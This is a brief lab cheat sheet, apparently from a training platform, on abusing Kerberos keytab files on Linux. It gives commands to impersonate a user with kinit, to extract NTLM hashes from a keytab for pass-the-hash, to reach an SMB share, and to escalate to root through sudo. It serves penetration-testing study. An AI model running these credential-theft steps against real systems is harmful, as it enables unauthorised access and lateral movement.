# METHOD:1 - Impersonate a user with keytab
```
klist
```
```
kinit linux01@INLANEFREIGHT.HTB -k -t /etc/krb5.keytab
```
```
klist
```
#### Access SMB share 
```
smbclient //DC01/carlos -k -c ls
```

# METHOD:2 - Extracting keytab hashes with keytabextract.py
```
python3 keytabextract.py /opt/specialfiles/carlos/carlos.keytab
```
- With the NTLM hash we can perform pass-the-hash attack 
#### Abusing keytab `ccache` 
- Privilege escalation to Root 
```
ssh svc_workstation@inlanefreight.htb@10.10.13.3 -p 2222
```
```
sudo -l & sudo su
```